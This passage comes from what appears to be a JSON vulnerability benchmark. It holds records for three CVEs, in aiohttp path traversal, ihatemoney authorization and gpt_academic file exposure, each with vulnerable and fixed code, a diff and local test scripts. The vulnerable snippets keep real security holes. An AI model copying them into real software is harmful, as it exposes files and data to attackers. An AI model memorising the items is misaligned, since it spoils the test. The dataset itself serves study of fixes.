        "snippet": "    async def _handle(self, request: Request) -> StreamResponse:\n        rel_url = request.match_info[\"filename\"]\n        try:\n            filename = Path(rel_url)\n            if filename.anchor:\n                # rel_url is an absolute name like\n                # /static/\\\\machine_name\\c$ or /static/D:\\path\n                # where the static dir is totally different\n                raise HTTPForbidden()\n            unresolved_path = self._directory.joinpath(filename)\n            if self._follow_symlinks:\n                normalized_path = Path(os.path.normpath(unresolved_path))\n                normalized_path.relative_to(self._directory)\n                filepath = normalized_path.resolve()\n            else:\n                filepath = unresolved_path.resolve()\n                filepath.relative_to(self._directory)\n        except (ValueError, FileNotFoundError) as error:\n            # relatively safe\n            raise HTTPNotFound() from error\n        except HTTPForbidden:\n            raise\n        except Exception as error:\n            # perm error or other kind!\n            request.app.logger.exception(error)\n            raise HTTPNotFound() from error\n\n        # on opening a dir, load its contents if allowed\n        if filepath.is_dir():\n            if self._show_index:\n                try:\n                    return Response(\n                        text=self._directory_as_html(filepath), content_type=\"text/html\"\n                    )\n                except PermissionError:\n                    raise HTTPForbidden()\n            else:\n                raise HTTPForbidden()\n        elif filepath.is_file():\n            return FileResponse(filepath, chunk_size=self._chunk_size)\n        else:\n            raise HTTPNotFound"
      }
    ],
    "vul_patch": "--- a/aiohttp/web_urldispatcher.py\n+++ b/aiohttp/web_urldispatcher.py\n@@ -16,9 +16,14 @@\n             url = url / filename\n \n         if append_version:\n+            unresolved_path = self._directory.joinpath(filename)\n             try:\n-                filepath = self._directory.joinpath(filename).resolve()\n-                if not self._follow_symlinks:\n+                if self._follow_symlinks:\n+                    normalized_path = Path(os.path.normpath(unresolved_path))\n+                    normalized_path.relative_to(self._directory)\n+                    filepath = normalized_path.resolve()\n+                else:\n+                    filepath = unresolved_path.resolve()\n                     filepath.relative_to(self._directory)\n             except (ValueError, FileNotFoundError):\n                 # ValueError for case when path point to symlink\n\n--- a/aiohttp/web_urldispatcher.py\n+++ b/aiohttp/web_urldispatcher.py\n@@ -7,8 +7,13 @@\n                 # /static/\\\\machine_name\\c$ or /static/D:\\path\n                 # where the static dir is totally different\n                 raise HTTPForbidden()\n-            filepath = self._directory.joinpath(filename).resolve()\n-            if not self._follow_symlinks:\n+            unresolved_path = self._directory.joinpath(filename)\n+            if self._follow_symlinks:\n+                normalized_path = Path(os.path.normpath(unresolved_path))\n+                normalized_path.relative_to(self._directory)\n+                filepath = normalized_path.resolve()\n+            else:\n+                filepath = unresolved_path.resolve()\n                 filepath.relative_to(self._directory)\n         except (ValueError, FileNotFoundError) as error:\n             # relatively safe\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-23334:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/aiohttp\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2024-23334/bin/python -m pytest -p no:aiohttp test_web_urldispatcher.py::test_follow_symlink_directory_traversal test_web_urldispatcher.py::test_follow_symlink_directory_traversal_after_normalization -v\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-23334:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/aiohttp\ngit apply --whitespace=nowarn /workspace/test.patch\ncd tests && /workspace/PoC_env/CVE-2024-23334/bin/python -m pytest -p no:aiohttp test_web_urldispatcher.py -v -k \"not test_follow_symlink_directory_traversal_after_normalization and not test_access_to_the_file_with_spaces and not test_follow_symlink_directory_traversal and not test_follow_symlink_directory_traversal_after_normalization\" -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2020-15120",
    "cve_description": "In \"I hate money\" before version 4.1.5, an authenticated member of one project can modify and delete members of another project, without knowledge of this other project's private code. This can be further exploited to access all bills of another project without knowledge of this other project's private code. With the default configuration, anybody is allowed to create a new project. An attacker can create a new project and then use it to become authenticated and exploit this flaw. As such, the exposure is similar to an unauthenticated attack, because it is trivial to become authenticated. This is fixed in version 4.1.5.",
    "cwe_info": {
      "CWE-863": {
        "name": "Incorrect Authorization",
        "description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check."
      }
    },
    "repo": "https://github.com/spiral-project/ihatemoney",
    "patch_url": [
      "https://github.com/spiral-project/ihatemoney/commit/8d77cf5d5646e1d2d8ded13f0660638f57e98471"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_384_1",
        "commit": "040d76af83411fb58ab400dc4eac909191a3e5fa",
        "file_path": "ihatemoney/models.py",
        "start_line": 380,
        "end_line": 385,
        "snippet": "        def get_by_name(self, name, project):\n            return (\n                Person.query.filter(Person.name == name)\n                .filter(Project.id == project.id)\n                .one()\n            )"
      },
      {
        "id": "vul_py_384_2",
        "commit": "040d76af83411fb58ab400dc4eac909191a3e5fa",
        "file_path": "ihatemoney/models.py",
        "start_line": 387,
        "end_line": 394,
        "snippet": "        def get(self, id, project=None):\n            if not project:\n                project = g.project\n            return (\n                Person.query.filter(Person.id == id)\n                .filter(Project.id == project.id)\n                .one()\n            )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_384_1",
        "commit": "8d77cf5d5646e1d2d8ded13f0660638f57e98471",
        "file_path": "ihatemoney/models.py",
        "start_line": 380,
        "end_line": 385,
        "snippet": "        def get_by_name(self, name, project):\n            return (\n                Person.query.filter(Person.name == name)\n                .filter(Person.project_id == project.id)\n                .one()\n            )"
      },
      {
        "id": "fix_py_384_2",
        "commit": "8d77cf5d5646e1d2d8ded13f0660638f57e98471",
        "file_path": "ihatemoney/models.py",
        "start_line": 387,
        "end_line": 394,
        "snippet": "        def get(self, id, project=None):\n            if not project:\n                project = g.project\n            return (\n                Person.query.filter(Person.id == id)\n                .filter(Person.project_id == project.id)\n                .one()\n            )"
      }
    ],
    "vul_patch": "--- a/ihatemoney/models.py\n+++ b/ihatemoney/models.py\n@@ -1,6 +1,6 @@\n         def get_by_name(self, name, project):\n             return (\n                 Person.query.filter(Person.name == name)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )\n\n--- a/ihatemoney/models.py\n+++ b/ihatemoney/models.py\n@@ -3,6 +3,6 @@\n                 project = g.project\n             return (\n                 Person.query.filter(Person.id == id)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-33979",
    "cve_description": "gpt_academic provides a graphical interface for ChatGPT/GLM. A vulnerability was found in gpt_academic 3.37 and prior. This issue affects some unknown processing of the component Configuration File Handler. The manipulation of the argument file leads to information disclosure. Since no sensitive files are configured to be off-limits, sensitive information files in some working directories can be read through the `/file` route, leading to sensitive information leakage. This affects users that uses file configurations via `config.py`, `config_private.py`, `Dockerfile`. A patch is available at commit 1dcc2873d2168ad2d3d70afcb453ac1695fbdf02. As a workaround, one may use environment variables instead of `config*.py` files to configure this project, or use docker-compose installation to configure this project.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/binary-husky/gpt_academic",
    "patch_url": [
      "https://github.com/binary-husky/gpt_academic/commit/1dcc2873d2168ad2d3d70afcb453ac1695fbdf02"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_115_1",
        "commit": "42cf738",
        "file_path": "main.py",
        "start_line": 3,
        "end_line": 200,
        "snippet": "def main():\n    import gradio as gr\n    if gr.__version__ not in ['3.28.3','3.32.2']: assert False, \"\\u8bf7\\u7528 pip install -r requirements.txt \\u5b89\\u88c5\\u4f9d\\u8d56\"\n    from request_llm.bridge_all import predict\n    from toolbox import format_io, find_free_port, on_file_uploaded, on_report_generated, get_conf, ArgsGeneralWrapper, DummyWith\n    # \\u5efa\\u8bae\\u60a8\\u590d\\u5236\\u4e00\\u4e2aconfig_private.py\\u653e\\u81ea\\u5df1\\u7684\\u79d8\\u5bc6, \\u5982API\\u548c\\u4ee3\\u7406\\u7f51\\u5740, \\u907f\\u514d\\u4e0d\\u5c0f\\u5fc3\\u4f20github\\u88ab\\u522b\\u4eba\\u770b\\u5230\n    proxies, WEB_PORT, LLM_MODEL, CONCURRENT_COUNT, AUTHENTICATION, CHATBOT_HEIGHT, LAYOUT, API_KEY, AVAIL_LLM_MODELS = \\\n        get_conf('proxies', 'WEB_PORT', 'LLM_MODEL', 'CONCURRENT_COUNT', 'AUTHENTICATION', 'CHATBOT_HEIGHT', 'LAYOUT', 'API_KEY', 'AVAIL_LLM_MODELS')\n\n    # \\u5982\\u679cWEB_PORT\\u662f-1, \\u5219\\u968f\\u673a\\u9009\\u53d6WEB\\u7aef\\u53e3\n    PORT = find_free_port() if WEB_PORT <= 0 else WEB_PORT\n    if not AUTHENTICATION: AUTHENTICATION = None\n\n    from check_proxy import get_current_version\n    initial_prompt = \"Serve me as a writing and programming assistant.\"\n    title_html = f\"<h1 align=\\\"center\\\">ChatGPT \\u5b66\\u672f\\u4f18\\u5316 {get_current_version()}</h1>\"\n    description =  \"\"\"\\u4ee3\\u7801\\u5f00\\u6e90\\u548c\\u66f4\\u65b0[\\u5730\\u5740\\ud83d\\ude80](https://github.com/binary-husky/chatgpt_academic)\\uff0c\\u611f\\u8c22\\u70ed\\u60c5\\u7684[\\u5f00\\u53d1\\u8005\\u4eec\\u2764\\ufe0f](https://github.com/binary-husky/chatgpt_academic/graphs/contributors)\"\"\"\n\n    # \\u95ee\\u8be2\\u8bb0\\u5f55, python \\u7248\\u672c\\u5efa\\u8bae3.9+\\uff08\\u8d8a\\u65b0\\u8d8a\\u597d\\uff09\n    import logging\n    os.makedirs(\"gpt_log\", exist_ok=True)\n    try:logging.basicConfig(filename=\"gpt_log/chat_secrets.log\", level=logging.INFO, encoding=\"utf-8\")\n    except:logging.basicConfig(filename=\"gpt_log/chat_secrets.log\", level=logging.INFO)\n    print(\"\\u6240\\u6709\\u95ee\\u8be2\\u8bb0\\u5f55\\u5c06\\u81ea\\u52a8\\u4fdd\\u5b58\\u5728\\u672c\\u5730\\u76ee\\u5f55./gpt_log/chat_secrets.log, \\u8bf7\\u6ce8\\u610f\\u81ea\\u6211\\u9690\\u79c1\\u4fdd\\u62a4\\u54e6\\uff01\")\n\n    # \\u4e00\\u4e9b\\u666e\\u901a\\u529f\\u80fd\\u6a21\\u5757\n    from core_functional import get_core_functions\n    functional = get_core_functions()\n\n    # \\u9ad8\\u7ea7\\u51fd\\u6570\\u63d2\\u4ef6\n    from crazy_functional import get_crazy_functions\n    crazy_fns = get_crazy_functions()\n\n    # \\u5904\\u7406markdown\\u6587\\u672c\\u683c\\u5f0f\\u7684\\u8f6c\\u53d8\n    gr.Chatbot.postprocess = format_io\n\n    # \\u505a\\u4e00\\u4e9b\\u5916\\u89c2\\u8272\\u5f69\\u4e0a\\u7684\\u8c03\\u6574\n    from theme import adjust_theme, advanced_css\n    set_theme = adjust_theme()\n\n    # \\u4ee3\\u7406\\u4e0e\\u81ea\\u52a8\\u66f4\\u65b0\n    from check_proxy import check_proxy, auto_update, warm_up_modules\n    proxy_info = check_proxy(proxies)\n\n    gr_L1 = lambda: gr.Row().style()\n    gr_L2 = lambda scale: gr.Column(scale=scale)\n    if LAYOUT == \"TOP-DOWN\":\n        gr_L1 = lambda: DummyWith()\n        gr_L2 = lambda scale: gr.Row()\n        CHATBOT_HEIGHT /= 2\n\n    cancel_handles = []\n    with gr.Blocks(title=\"ChatGPT \\u5b66\\u672f\\u4f18\\u5316\", theme=set_theme, analytics_enabled=False, css=advanced_css) as demo:\n        gr.HTML(title_html)\n        cookies = gr.State({'api_key': API_KEY, 'llm_model': LLM_MODEL})\n        with gr_L1():\n            with gr_L2(scale=2):\n                chatbot = gr.Chatbot(label=f\"\\u5f53\\u524d\\u6a21\\u578b\\uff1a{LLM_MODEL}\")\n                chatbot.style(height=CHATBOT_HEIGHT)\n                history = gr.State([])\n            with gr_L2(scale=1):\n                with gr.Accordion(\"\\u8f93\\u5165\\u533a\", open=True) as area_input_primary:\n                    with gr.Row():\n                        txt = gr.Textbox(show_label=False, placeholder=\"Input question here.\").style(container=False)\n                    with gr.Row():\n                        submitBtn = gr.Button(\"\\u63d0\\u4ea4\", variant=\"primary\")\n                    with gr.Row():\n                        resetBtn = gr.Button(\"\\u91cd\\u7f6e\", variant=\"secondary\"); resetBtn.style(size=\"sm\")\n                        stopBtn = gr.Button(\"\\u505c\\u6b62\", variant=\"secondary\"); stopBtn.style(size=\"sm\")\n                        clearBtn = gr.Button(\"\\u6e05\\u9664\", variant=\"secondary\", visible=False); clearBtn.style(size=\"sm\")\n                    with gr.Row():\n                        status = gr.Markdown(f\"Tip: \\u6309Enter\\u63d0\\u4ea4, \\u6309Shift+Enter\\u6362\\u884c\\u3002\\u5f53\\u524d\\u6a21\\u578b: {LLM_MODEL} \\n {proxy_info}\")\n                with gr.Accordion(\"\\u57fa\\u7840\\u529f\\u80fd\\u533a\", open=True) as area_basic_fn:\n                    with gr.Row():\n                        for k in functional:\n                            if (\"Visible\" in functional[k]) and (not functional[k][\"Visible\"]): continue\n                            variant = functional[k][\"Color\"] if \"Color\" in functional[k] else \"secondary\"\n                            functional[k][\"Button\"] = gr.Button(k, variant=variant)\n                with gr.Accordion(\"\\u51fd\\u6570\\u63d2\\u4ef6\\u533a\", open=True) as area_crazy_fn:\n                    with gr.Row():\n                        gr.Markdown(\"\\u6ce8\\u610f\\uff1a\\u4ee5\\u4e0b\\u201c\\u7ea2\\u989c\\u8272\\u201d\\u6807\\u8bc6\\u7684\\u51fd\\u6570\\u63d2\\u4ef6\\u9700\\u4ece\\u8f93\\u5165\\u533a\\u8bfb\\u53d6\\u8def\\u5f84\\u4f5c\\u4e3a\\u53c2\\u6570.\")\n                    with gr.Row():\n                        for k in crazy_fns:\n                            if not crazy_fns[k].get(\"AsButton\", True): continue\n                            variant = crazy_fns[k][\"Color\"] if \"Color\" in crazy_fns[k] else \"secondary\"\n                            crazy_fns[k][\"Button\"] = gr.Button(k, variant=variant)\n                            crazy_fns[k][\"Button\"].style(size=\"sm\")\n                    with gr.Row():\n                        with gr.Accordion(\"\\u66f4\\u591a\\u51fd\\u6570\\u63d2\\u4ef6\", open=True):\n                            dropdown_fn_list = [k for k in crazy_fns.keys() if not crazy_fns[k].get(\"AsButton\", True)]\n                            with gr.Row():\n                                dropdown = gr.Dropdown(dropdown_fn_list, value=r\"\\u6253\\u5f00\\u63d2\\u4ef6\\u5217\\u8868\", label=\"\").style(container=False)\n                            with gr.Row():\n                                plugin_advanced_arg = gr.Textbox(show_label=True, label=\"\\u9ad8\\u7ea7\\u53c2\\u6570\\u8f93\\u5165\\u533a\", visible=False, \n                                                                 placeholder=\"\\u8fd9\\u91cc\\u662f\\u7279\\u6b8a\\u51fd\\u6570\\u63d2\\u4ef6\\u7684\\u9ad8\\u7ea7\\u53c2\\u6570\\u8f93\\u5165\\u533a\").style(container=False)\n                            with gr.Row():\n                                switchy_bt = gr.Button(r\"\\u8bf7\\u5148\\u4ece\\u63d2\\u4ef6\\u5217\\u8868\\u4e2d\\u9009\\u62e9\", variant=\"secondary\")\n                    with gr.Row():\n                        with gr.Accordion(\"\\u70b9\\u51fb\\u5c55\\u5f00\\u201c\\u6587\\u4ef6\\u4e0a\\u4f20\\u533a\\u201d\\u3002\\u4e0a\\u4f20\\u672c\\u5730\\u6587\\u4ef6\\u53ef\\u4f9b\\u7ea2\\u8272\\u51fd\\u6570\\u63d2\\u4ef6\\u8c03\\u7528\\u3002\", open=False) as area_file_up:\n                            file_upload = gr.Files(label=\"\\u4efb\\u4f55\\u6587\\u4ef6, \\u4f46\\u63a8\\u8350\\u4e0a\\u4f20\\u538b\\u7f29\\u6587\\u4ef6(zip, tar)\", file_count=\"multiple\")\n                with gr.Accordion(\"\\u66f4\\u6362\\u6a21\\u578b & SysPrompt & \\u4ea4\\u4e92\\u754c\\u9762\\u5e03\\u5c40\", open=(LAYOUT == \"TOP-DOWN\")):\n                    system_prompt = gr.Textbox(show_label=True, placeholder=f\"System Prompt\", label=\"System prompt\", value=initial_prompt)\n                    top_p = gr.Slider(minimum=-0, maximum=1.0, value=1.0, step=0.01,interactive=True, label=\"Top-p (nucleus sampling)\",)\n                    temperature = gr.Slider(minimum=-0, maximum=2.0, value=1.0, step=0.01, interactive=True, label=\"Temperature\",)\n                    max_length_sl = gr.Slider(minimum=256, maximum=4096, value=512, step=1, interactive=True, label=\"Local LLM MaxLength\",)\n                    checkboxes = gr.CheckboxGroup([\"\\u57fa\\u7840\\u529f\\u80fd\\u533a\", \"\\u51fd\\u6570\\u63d2\\u4ef6\\u533a\", \"\\u5e95\\u90e8\\u8f93\\u5165\\u533a\", \"\\u8f93\\u5165\\u6e05\\u9664\\u952e\", \"\\u63d2\\u4ef6\\u53c2\\u6570\\u533a\"], value=[\"\\u57fa\\u7840\\u529f\\u80fd\\u533a\", \"\\u51fd\\u6570\\u63d2\\u4ef6\\u533a\"], label=\"\\u663e\\u793a/\\u9690\\u85cf\\u529f\\u80fd\\u533a\")\n                    md_dropdown = gr.Dropdown(AVAIL_LLM_MODELS, value=LLM_MODEL, label=\"\\u66f4\\u6362LLM\\u6a21\\u578b/\\u8bf7\\u6c42\\u6e90\").style(container=False)\n\n                    gr.Markdown(description)\n                with gr.Accordion(\"\\u5907\\u9009\\u8f93\\u5165\\u533a\", open=True, visible=False) as area_input_secondary:\n                    with gr.Row():\n                        txt2 = gr.Textbox(show_label=False, placeholder=\"Input question here.\", label=\"\\u8f93\\u5165\\u533a2\").style(container=False)\n                    with gr.Row():\n                        submitBtn2 = gr.Button(\"\\u63d0\\u4ea4\", variant=\"primary\")\n                    with gr.Row():\n                        resetBtn2 = gr.Button(\"\\u91cd\\u7f6e\", variant=\"secondary\"); resetBtn2.style(size=\"sm\")\n                        stopBtn2 = gr.Button(\"\\u505c\\u6b62\", variant=\"secondary\"); stopBtn2.style(size=\"sm\")\n                        clearBtn2 = gr.Button(\"\\u6e05\\u9664\", variant=\"secondary\", visible=False); clearBtn2.style(size=\"sm\")\n        # \\u529f\\u80fd\\u533a\\u663e\\u793a\\u5f00\\u5173\\u4e0e\\u529f\\u80fd\\u533a\\u7684\\u4e92\\u52a8\n        def fn_area_visibility(a):\n            ret = {}\n            ret.update({area_basic_fn: gr.update(visible=(\"\\u57fa\\u7840\\u529f\\u80fd\\u533a\" in a))})\n            ret.update({area_crazy_fn: gr.update(visible=(\"\\u51fd\\u6570\\u63d2\\u4ef6\\u533a\" in a))})\n            ret.update({area_input_primary: gr.update(visible=(\"\\u5e95\\u90e8\\u8f93\\u5165\\u533a\" not in a))})\n            ret.update({area_input_secondary: gr.update(visible=(\"\\u5e95\\u90e8\\u8f93\\u5165\\u533a\" in a))})\n            ret.update({clearBtn: gr.update(visible=(\"\\u8f93\\u5165\\u6e05\\u9664\\u952e\" in a))})\n            ret.update({clearBtn2: gr.update(visible=(\"\\u8f93\\u5165\\u6e05\\u9664\\u952e\" in a))})\n            ret.update({plugin_advanced_arg: gr.update(visible=(\"\\u63d2\\u4ef6\\u53c2\\u6570\\u533a\" in a))})\n            if \"\\u5e95\\u90e8\\u8f93\\u5165\\u533a\" in a: ret.update({txt: gr.update(value=\"\")})\n            return ret\n        checkboxes.select(fn_area_visibility, [checkboxes], [area_basic_fn, area_crazy_fn, area_input_primary, area_input_secondary, txt, txt2, clearBtn, clearBtn2, plugin_advanced_arg] )\n        # \\u6574\\u7406\\u53cd\\u590d\\u51fa\\u73b0\\u7684\\u63a7\\u4ef6\\u53e5\\u67c4\\u7ec4\\u5408\n        input_combo = [cookies, max_length_sl, md_dropdown, txt, txt2, top_p, temperature, chatbot, history, system_prompt, plugin_advanced_arg]\n        output_combo = [cookies, chatbot, history, status]\n        predict_args = dict(fn=ArgsGeneralWrapper(predict), inputs=input_combo, outputs=output_combo)\n        # \\u63d0\\u4ea4\\u6309\\u94ae\\u3001\\u91cd\\u7f6e\\u6309\\u94ae\n        cancel_handles.append(txt.submit(**predict_args))\n        cancel_handles.append(txt2.submit(**predict_args))\n        cancel_handles.append(submitBtn.click(**predict_args))\n        cancel_handles.append(submitBtn2.click(**predict_args))\n        resetBtn.click(lambda: ([], [], \"\\u5df2\\u91cd\\u7f6e\"), None, [chatbot, history, status])\n        resetBtn2.click(lambda: ([], [], \"\\u5df2\\u91cd\\u7f6e\"), None, [chatbot, history, status])\n        clearBtn.click(lambda: (\"\",\"\"), None, [txt, txt2])\n        clearBtn2.click(lambda: (\"\",\"\"), None, [txt, txt2])\n        # \\u57fa\\u7840\\u529f\\u80fd\\u533a\\u7684\\u56de\\u8c03\\u51fd\\u6570\\u6ce8\\u518c\n        for k in functional:\n            if (\"Visible\" in functional[k]) and (not functional[k][\"Visible\"]): continue\n            click_handle = functional[k][\"Button\"].click(fn=ArgsGeneralWrapper(predict), inputs=[*input_combo, gr.State(True), gr.State(k)], outputs=output_combo)\n            cancel_handles.append(click_handle)\n        # \\u6587\\u4ef6\\u4e0a\\u4f20\\u533a\\uff0c\\u63a5\\u6536\\u6587\\u4ef6\\u540e\\u4e0echatbot\\u7684\\u4e92\\u52a8\n        file_upload.upload(on_file_uploaded, [file_upload, chatbot, txt, txt2, checkboxes], [chatbot, txt, txt2])\n        # \\u51fd\\u6570\\u63d2\\u4ef6-\\u56fa\\u5b9a\\u6309\\u94ae\\u533a\n        for k in crazy_fns:\n            if not crazy_fns[k].get(\"AsButton\", True): continue\n            click_handle = crazy_fns[k][\"Button\"].click(ArgsGeneralWrapper(crazy_fns[k][\"Function\"]), [*input_combo, gr.State(PORT)], output_combo)\n            click_handle.then(on_report_generated, [file_upload, chatbot], [file_upload, chatbot])\n            cancel_handles.append(click_handle)\n        # \\u51fd\\u6570\\u63d2\\u4ef6-\\u4e0b\\u62c9\\u83dc\\u5355\\u4e0e\\u968f\\u53d8\\u6309\\u94ae\\u7684\\u4e92\\u52a8\n        def on_dropdown_changed(k):\n            variant = crazy_fns[k][\"Color\"] if \"Color\" in crazy_fns[k] else \"secondary\"\n            ret = {switchy_bt: gr.update(value=k, variant=variant)}\n            if crazy_fns[k].get(\"AdvancedArgs\", False): # \\u662f\\u5426\\u5524\\u8d77\\u9ad8\\u7ea7\\u63d2\\u4ef6\\u53c2\\u6570\\u533a\n                ret.update({plugin_advanced_arg: gr.update(visible=True,  label=f\"\\u63d2\\u4ef6[{k}]\\u7684\\u9ad8\\u7ea7\\u53c2\\u6570\\u8bf4\\u660e\\uff1a\" + crazy_fns[k].get(\"ArgsReminder\", [f\"\\u6ca1\\u6709\\u63d0\\u4f9b\\u9ad8\\u7ea7\\u53c2\\u6570\\u529f\\u80fd\\u8bf4\\u660e\"]))})\n            else:\n                ret.update({plugin_advanced_arg: gr.update(visible=False, label=f\"\\u63d2\\u4ef6[{k}]\\u4e0d\\u9700\\u8981\\u9ad8\\u7ea7\\u53c2\\u6570\\u3002\")})\n            return ret\n        dropdown.select(on_dropdown_changed, [dropdown], [switchy_bt, plugin_advanced_arg] )\n        def on_md_dropdown_changed(k):\n            return {chatbot: gr.update(label=\"\\u5f53\\u524d\\u6a21\\u578b\\uff1a\"+k)}\n        md_dropdown.select(on_md_dropdown_changed, [md_dropdown], [chatbot] )\n        # \\u968f\\u53d8\\u6309\\u94ae\\u7684\\u56de\\u8c03\\u51fd\\u6570\\u6ce8\\u518c\n        def route(k, *args, **kwargs):\n            if k in [r\"\\u6253\\u5f00\\u63d2\\u4ef6\\u5217\\u8868\", r\"\\u8bf7\\u5148\\u4ece\\u63d2\\u4ef6\\u5217\\u8868\\u4e2d\\u9009\\u62e9\"]: return\n            yield from ArgsGeneralWrapper(crazy_fns[k][\"Function\"])(*args, **kwargs)\n        click_handle = switchy_bt.click(route,[switchy_bt, *input_combo, gr.State(PORT)], output_combo)\n        click_handle.then(on_report_generated, [file_upload, chatbot], [file_upload, chatbot])\n        cancel_handles.append(click_handle)\n        # \\u7ec8\\u6b62\\u6309\\u94ae\\u7684\\u56de\\u8c03\\u51fd\\u6570\\u6ce8\\u518c\n        stopBtn.click(fn=None, inputs=None, outputs=None, cancels=cancel_handles)\n        stopBtn2.click(fn=None, inputs=None, outputs=None, cancels=cancel_handles)\n\n    # gradio\\u7684inbrowser\\u89e6\\u53d1\\u4e0d\\u592a\\u7a33\\u5b9a\\uff0c\\u56de\\u6eda\\u4ee3\\u7801\\u5230\\u539f\\u59cb\\u7684\\u6d4f\\u89c8\\u5668\\u6253\\u5f00\\u51fd\\u6570\n    def auto_opentab_delay():\n        import threading, webbrowser, time\n        print(f\"\\u5982\\u679c\\u6d4f\\u89c8\\u5668\\u6ca1\\u6709\\u81ea\\u52a8\\u6253\\u5f00\\uff0c\\u8bf7\\u590d\\u5236\\u5e76\\u8f6c\\u5230\\u4ee5\\u4e0bURL\\uff1a\")\n        print(f\"\\t\\uff08\\u4eae\\u8272\\u4e3b\\u9898\\uff09: http://localhost:{PORT}\")\n        print(f\"\\t\\uff08\\u6697\\u8272\\u4e3b\\u9898\\uff09: http://localhost:{PORT}/?__theme=dark\")\n        def open():\n            time.sleep(2)       # \\u6253\\u5f00\\u6d4f\\u89c8\\u5668\n            DARK_MODE, = get_conf('DARK_MODE')\n            if DARK_MODE: webbrowser.open_new_tab(f\"http://localhost:{PORT}/?__theme=dark\")\n            else: webbrowser.open_new_tab(f\"http://localhost:{PORT}\")\n        threading.Thread(target=open, name=\"open-browser\", daemon=True).start()\n        threading.Thread(target=auto_update, name=\"self-upgrade\", daemon=True).start()\n        threading.Thread(target=warm_up_modules, name=\"warm-up\", daemon=True).start()\n\n    auto_opentab_delay()\n    demo.queue(concurrency_count=CONCURRENT_COUNT).launch(server_name=\"0.0.0.0\", server_port=PORT, auth=AUTHENTICATION, favicon_path=\"docs/logo.png\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_115_1",
        "commit": "1dcc287",
        "file_path": "main.py",
        "start_line": 3,
        "end_line": 202,
        "snippet": "def main():\n    import gradio as gr\n    if gr.__version__ not in ['3.28.3','3.32.2']: assert False, \"\\u8bf7\\u7528 pip install -r requirements.txt \\u5b89\\u88c5\\u4f9d\\u8d56\"\n    from request_llm.bridge_all import predict\n    from toolbox import format_io, find_free_port, on_file_uploaded, on_report_generated, get_conf, ArgsGeneralWrapper, DummyWith\n    # \\u5efa\\u8bae\\u60a8\\u590d\\u5236\\u4e00\\u4e2aconfig_private.py\\u653e\\u81ea\\u5df1\\u7684\\u79d8\\u5bc6, \\u5982API\\u548c\\u4ee3\\u7406\\u7f51\\u5740, \\u907f\\u514d\\u4e0d\\u5c0f\\u5fc3\\u4f20github\\u88ab\\u522b\\u4eba\\u770b\\u5230\n    proxies, WEB_PORT, LLM_MODEL, CONCURRENT_COUNT, AUTHENTICATION, CHATBOT_HEIGHT, LAYOUT, API_KEY, AVAIL_LLM_MODELS = \\\n        get_conf('proxies', 'WEB_PORT', 'LLM_MODEL', 'CONCURRENT_COUNT', 'AUTHENTICATION', 'CHATBOT_HEIGHT', 'LAYOUT', 'API_KEY', 'AVAIL_LLM_MODELS')\n\n    # \\u5982\\u679cWEB_PORT\\u662f-1, \\u5219\\u968f\\u673a\\u9009\\u53d6WEB\\u7aef\\u53e3\n    PORT = find_free_port() if WEB_PORT <= 0 else WEB_PORT\n    if not AUTHENTICATION: AUTHENTICATION = None\n\n    from check_proxy import get_current_version\n    initial_prompt = \"Serve me as a writing and programming assistant.\"\n    title_html = f\"<h1 align=\\\"center\\\">ChatGPT \\u5b66\\u672f\\u4f18\\u5316 {get_current_version()}</h1>\"\n    description =  \"\"\"\\u4ee3\\u7801\\u5f00\\u6e90\\u548c\\u66f4\\u65b0[\\u5730\\u5740\\ud83d\\ude80](https://github.com/binary-husky/chatgpt_academic)\\uff0c\\u611f\\u8c22\\u70ed\\u60c5\\u7684[\\u5f00\\u53d1\\u8005\\u4eec\\u2764\\ufe0f](https://github.com/binary-husky/chatgpt_academic/graphs/contributors)\"\"\"\n\n    # \\u95ee\\u8be2\\u8bb0\\u5f55, python \\u7248\\u672c\\u5efa\\u8bae3.9+\\uff08\\u8d8a\\u65b0\\u8d8a\\u597d\\uff09\n    import logging\n    os.makedirs(\"gpt_log\", exist_ok=True)\n    try:logging.basicConfig(filename=\"gpt_log/chat_secrets.log\", level=logging.INFO, encoding=\"utf-8\")\n    except:logging.basicConfig(filename=\"gpt_log/chat_secrets.log\", level=logging.INFO)\n    print(\"\\u6240\\u6709\\u95ee\\u8be2\\u8bb0\\u5f55\\u5c06\\u81ea\\u52a8\\u4fdd\\u5b58\\u5728\\u672c\\u5730\\u76ee\\u5f55./gpt_log/chat_secrets.log, \\u8bf7\\u6ce8\\u610f\\u81ea\\u6211\\u9690\\u79c1\\u4fdd\\u62a4\\u54e6\\uff01\")\n\n    # \\u4e00\\u4e9b\\u666e\\u901a\\u529f\\u80fd\\u6a21\\u5757\n    from core_functional import get_core_functions\n    functional = get_core_functions()\n\n    # \\u9ad8\\u7ea7\\u51fd\\u6570\\u63d2\\u4ef6\n    from crazy_functional import get_crazy_functions\n    crazy_fns = get_crazy_functions()\n\n    # \\u5904\\u7406markdown\\u6587\\u672c\\u683c\\u5f0f\\u7684\\u8f6c\\u53d8\n    gr.Chatbot.postprocess = format_io\n\n    # \\u505a\\u4e00\\u4e9b\\u5916\\u89c2\\u8272\\u5f69\\u4e0a\\u7684\\u8c03\\u6574\n    from theme import adjust_theme, advanced_css\n    set_theme = adjust_theme()\n\n    # \\u4ee3\\u7406\\u4e0e\\u81ea\\u52a8\\u66f4\\u65b0\n    from check_proxy import check_proxy, auto_update, warm_up_modules\n    proxy_info 